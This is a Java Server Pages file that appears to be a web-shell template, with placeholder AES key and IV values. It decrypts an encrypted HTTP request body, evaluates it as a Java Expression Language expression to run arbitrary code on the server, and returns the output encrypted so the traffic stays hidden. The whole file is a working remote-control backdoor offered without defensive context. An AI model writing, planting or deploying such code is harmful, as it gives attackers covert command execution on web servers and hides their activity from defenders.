<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public static String encrypt(final String plaintext) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return new sun.misc.BASE64Encoder().encode(result).replaceAll("\r|\n|\r\n", "");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = new sun.misc.BASE64Decoder().decodeBuffer(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
    br.close();

    if(wholeStr != null && !wholeStr.trim().equals("")) {
        wholeStr = decrypt(wholeStr.substring(0, wholeStr.length() - 1));
        ELProcessor el = new ELProcessor();
        BufferedInputStream bis = (BufferedInputStream)el.getValue(wholeStr,Class.forName("java.io.BufferedInputStream"));
        int len = 0;
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = bis.read(bytes)) != -1){
            baos.write(bytes,0,len);
        }
       
        response.getWriter().print(encrypt(baos.toString().trim()));
		bis.close();
        baos.close();
    }
%>
